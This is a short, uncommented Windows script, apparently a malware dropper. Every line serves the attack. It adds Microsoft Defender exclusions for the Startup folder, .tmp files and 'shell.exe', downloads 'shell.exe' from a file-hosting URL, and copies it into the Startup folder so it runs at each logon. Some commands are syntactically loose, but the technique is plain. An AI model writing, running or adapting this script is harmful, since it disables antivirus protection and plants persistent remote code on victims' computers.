Add-MpPreference -ExclusionPath "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
Add-MpPreference -ExclusionExtension ".tmp"
Add-MpPreference -ExclusionProcess "C:\Windows\System32\shell.exe"
Add-MpPreference -ExclusionProcess "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"
Start-BitsTransfer "https://download1481.mediafire.com/he5d591zxntg/mpkirdq6taeo4l0/shell.exe" 
copy /d C:\Users\lohit\Documents\shell.exe  %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup